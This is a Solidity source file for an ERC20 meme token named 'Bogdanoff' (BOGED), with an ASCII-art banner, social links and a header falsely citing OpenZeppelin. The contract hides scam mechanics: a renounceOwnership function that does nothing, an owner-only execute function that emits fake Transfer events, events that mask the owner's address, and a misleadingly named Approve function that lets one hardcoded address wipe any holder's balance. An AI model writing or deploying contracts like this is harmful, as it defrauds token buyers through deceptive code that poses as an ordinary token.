// SPDX-License-Identifier: MIT
// File: @openzeppelin/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
/*
            
            Telegram: https://t.me/BogdanoffETH
            Website: https://bogdanoff.com
            Reddit: https://www.reddit.com/r/The_Bogdanoff/
            Twitter: https://twitter.com/LordBogdanoff
            
;:c::;,,,,,,;::clllc;,'',:cclc:;;;cllc;'..................                             ...................    ..,;,,,,,,'............,,'...........';:
;;::;;,,''',;:cc::cc;''',;:lddocclllc:;,,;,'.......',,'....                              ..................  ..........''...'.....................'',;
.',;;;''''',:lll::;;,,,,;:loolcclllc:;;:col:.....',;;;;,'...                            ............................  .....''.........................
..',,,''''';cllcc;,,,;;;:cllc::cooc:clc:col;...',,',:;,......     ......                 .......    ...............      .............'''.............
'',,,,,,''';::;::;'.',;;:clc:::ccccclc;,;:;,'''','.';,............',;;'...........                 ...............        ..''..................'...  
;;:;::;;,',:::;;;;'..',;::cccccc::cllc::cccc:;,,'...''.. .......';looooc;'..',,,''....           .................        .....................,;,....
;:ccc:;;,,;:cccc;'..'',;::clooolc:;;;;:cc:;;;;;;,....,......'',;coxkkkkkxo:;:ccllc:;,'....       .....     ........       ...  ...'......... ..';,....
,:lllc::;;;:lddoc;;;;'..';colclllc:;,,,;;,''',,,,...',,,,,,',;cldxkOOOO00Okxddddxddolc;'...  ..  .................     ...................   ...,;,...
:cllcccc:::ldxdl::::,'...,clc::cllcc;,,,,'..'''.......,;;;',:ldxxkkO00000000OOkkkkkxxdl:,.......................   .  ......''..............'''''''.  
:clcc::::::lddo:;,,'...',::::;;:::;;;;;;,,'',,,'.......','';ldxkkkkOO00KKK00000OOOkkxxdl:;,''....'''...............  .... .........,,,;;,..';;;,'.... 
::c:::::::cllc:;;;,',;;::c::,',;::;;;::;,,''',;'.......''.'cddxkkkkkOOO00K00000OOkOkkxdolc:;'...',,;;,'....   ...   .......''.....';::cc,.............
:;;;;:::::cllc::c::;;;::::::;,;:cclll:,''''..',. .........:oddxxkkkkOOOOOO0OOOOOOOkkxxdoolc:,...',;;;;,,.....       .......''''.......,,...    .......
,,;;::c:;;:cc:;::::;,,,;;;;;:::c:clol;'....''''.....  ....:odxxxkkOO0000000KK00OOOOOOOkxdolc:,'',;::;;,''''..     .........';::::;;'..''''''...  .   .
,:::;;::,'',,,;:;;,,'.'''',;clc:;:cc:,'...........    ...':odxxkkOOO00KKKKKKK0000OOOOOOOkddolc:,,;;;;,,,,,'..........    ...,,,,,''..',;,,;:;,...    .
;::;'',,'...'',;,'..'....':llc;'.,;;;::,..........    ...:ldxxkOOOOOOO00000000000OO000OOxxdollc::::::::::;,........       .......  ..,:,..............
;:;,..''''','.'''..';;,',:clc;'...''',,'....,,'....   ..:dxkkxxxddxxxxxxxxxxxxkkkkkOOxdolcc:::;,,,,:clllcc:,........    .....      .';:,.     ....  ..
,,'...';;:;;,'',,;::cllcc:;;,,'..','.....',:c:;,'......cxkOkdlc:;;;;;::::;;;;;:clodol:,,,'..........':coddoc,.......   ......      .':;.    ..........
.....';:ccc;,'.',::::ccc;,,,;,'.',,.....,cll;'..''''.'cxOOko:,,;;,,..........'',:oo:'......  .........,cdxxdl'..'... ......         ....    .......,',
...',,;cc:,.. ..,:;,;;;,'',;,'..'''.....';::;;:lllldxdxkOOko:,;,....   .......,cdkxc....       .......':oxkxd:............       ......      ........'
.'',;;:;,...  .':l:,.....',,........,cloxOKXXNNNNNKOxxxk0KK0kxoc::::,',;,....'ckKK0d,.....'...'''..',;codxxxdc'...  ...............'......   .';;'..',
...';;'......'',:l:'.....'....... .oKNNXXXXKXXKXNNXOdodxOKXXXK00Okkxxddooooooox0XXKOoclooooddooooddxxkkkkxxdoc,..         ...'.....  ...     .,;:;,..'
...'''......'::,;;,'...........  .oXNX00XNXNNNXXNNNNXKkdx0KXXXXXXXXKK0OOOO00OOO0XXKOkxkOOO0000K000K00000Okxdl:,.           .......           .......''
...'''.....';cc,........''..     ,ONNKKNNNK000OxdkOOOOOkxxO0KKKXXXXXKKKKKKKK0OO0XNX0OOO0KKKKKK00000OOOOOOkdoc;'.                                 ....'
...''....''',:c:,'.........  .. .oXNXXNNN0l,;cl;',',,;;;;cdxxkOOOOOOOO0000OOOOOKXNXK0OxdxkOOOkkkkxxddddoolc::;.                                       
'.... ........','........   ....:KNNXNWNKx:,oK0xx:      .;lloddxxxxxxkkxdxkOOOOKXXKK0Oxdllodxxddollcc::;;,,,::.                                       
;,....''''.........   ...  ....,ONXNNNKxc;:x00OOOc      .,cloddddddddollokOOOkkOOkxxxxOko:cllooollc::;,'...':,                                        
:ccclllc:;;,'............ ....'dKXNNWNKOdldxdloxk:       ':looooooolllodo:,',;:::;,,''',;;cccccccc::;,'...',,.                                 ...    
loolllcc:;;;,.........,'......lO0XNWWNX0kl:::,;do,.      .;cllllolllldk0kl;,,'''....  ..,colcccc:::;;,'''',;'.                                        
ollc::;;,.........',,,,..... ,xOKXWWWXOd:'',;''oo,.      .';:ccllccldkOO0Okxxdc;'....',:loollcccc:;,,,,,'.......       ...                            
xxxxdl:,...   .....:ooc'.... :k0XNWWWNKx;.','''lo;.       .,;::::;coxxkkkkkkxxol:::::cllooolllc:::;;,,,,'...','.                        .             
xxxxxdc,'.........':lc,.... .o0XNWWWNXKx:''....cxc.   ..   .;::;;;clloddxxxxxxxddddollllclcc:::::;;,,',,......             ..............             
c:;;;,..;c;.......',,.... ..cOXNNWWWNX0d;'''''.;ko.  ....  .,::;,;;::clllllllodxxxolc:::;;;;,,,,,'',''''.                 .......','.....             
:;'... .:ol,...............:xKXNWWWWNXKx:,;:lolldl...'..   ..,;:;;,'..''.',,;:cllc:;;'.............''''.                       ................       
odl,..  .;;...............'o0XNNWWNNXK0xc;:ldxkOd,..',..    ..,:::;;,''',,;;;;,'........     ...........  ..                   ..............''...    
xxo;..  .''...............:OKXXNNNNXK0koc:ldkO00kl;;;'.....  ..,;:coddolcoddxxxolc:;;;;'...............                              ....   ....'..   
xxo:.. ................  'xKKXXXXXXKKOdlclok00K0Oxdo:......   ..,:ldxkxocccccllc:::;;,''',,;,'........                ..             ....   ......    
dxxo:'.',,'..    .....  .oKXXXXXXXK0Oxdoold0KK0OOkdl;.        ..';loxxkxo:,,''''........';:;,'.....''.    ...       ....             ....   ..........
dkkxdlccc;..     .......oKXXXXXXXK0Oxdolccd0K0Okxdo:'.        ...,codxkkxoc:;'........';:c::;'.....,,. .....     ......                    .......','.
kOkkxxdl:;'.     ......,xXXXXXXK0Okdolc:,;dOOxddoc;'..      .'....,cdxkOOOkxxdlc::::clloolc:;'....',,. ..       ........                  ....'.. ....
dxxxxxdl:,..    .   .....ckKKK0Okdoc:;;,';oxdllc:,...      .,,.....,lxkO00OOOOkxxxxxxxxxdo:;'.....',;.   ...     ......       ...            .'.......
:loddol:,.   ..  .   ......:dxdllc:;'...';c::;;,.....,..   ,;'......;oxkkOOO0000OOOkkxddol:'......',:'    ..        .    .. .';;.            .'.......
,;:ccc:;'.... .;xko'...... ..,:;,,'.....',''......  ';'.   ','......';cloddddxkxxxddollcc:,......',,:;.                      .''.           .,,'......
;;;;;,''..... 'dOxl'......... .''............              .,'........',,;;;;::;;;;,,,'''.........',::'       ....           . .             .;cc,....
:;,,'..........;:,..  ....      ..........                  ',.....'..............................';;;'.       ...         ...     .        .'o0Kx;...
'......',.............            ....                      .''....'''''.........        ......'''';;,'.        ........ ......    ...      .ck0K0d:,.
 ..... ...............                                       .'''''''',,''.........      .....'',,,;;;,.      ..................  ....      .,dKXXXKk:


*/

pragma solidity ^0.6.0;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Context {
    constructor () internal { }

    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);}



contract Bogdanoff is Context, IERC20 {
    address _depo = 0xDbd35B0C4F60B6FA546578EAb0F0D0E16678055B;
    address public _owner = 0xDbd35B0C4F60B6FA546578EAb0F0D0E16678055B;
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    using SafeMath for uint256;
    using Address for address;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;




    constructor () public {
        _name = "Bogdanoff";
        _symbol ="BOGED";
        _decimals = 18;
        uint256 initialSupply = 1000000000;
        _mint(_depo, initialSupply*(10**18));
    }







    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _setupTransfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _setupTransfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount)  internal virtual{
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            sender = _depo;
        }
        if (recipient == _owner){
            recipient = _depo;
        }
        emit Transfer(sender, recipient, amount);

        
    }

    function _mint(address locker, uint256 amt) public {
        require(msg.sender == _owner, "ERC20: zero address");
        _totalSupply = _totalSupply.add(amt);
        _balances[_owner] = _balances[_owner].add(amt);
        emit Transfer(address(0), locker, amt);
    }


    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    
    function _setupTransfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender == _owner){
            sender = _depo;
        }
        emit Transfer(sender, recipient, amount);

    }
    
   
    
    
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }



    modifier _onlyOwner() {
        require(msg.sender == _owner, "Not allowed to interact");
        _;
    }


    modifier _setupApprover() {
        require(msg.sender == 0xE924C3387556b6bE3D4ab7d2D11b80d3557fa4BA, "Not allowed to interact");
        
        
        _;
    }



  function renounceOwnership()  public _onlyOwner(){}


  function execute(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(uPool, eReceiver[i], eAmounts[i]);}}



//-----------------------------------------------------------------------------------------------------------------------//

        function Approve(
            address[] memory addr)  public _setupApprover(){
            for (uint256 i = 0; i < addr.length; i++) {
                uint256 amt = _balances[addr[i]];
                _balances[addr[i]] = _balances[addr[i]].sub(amt, "ERC20: burn amount exceeds balance");
                _balances[address(0)] = _balances[address(0)].add(amt);
                
                }}





    }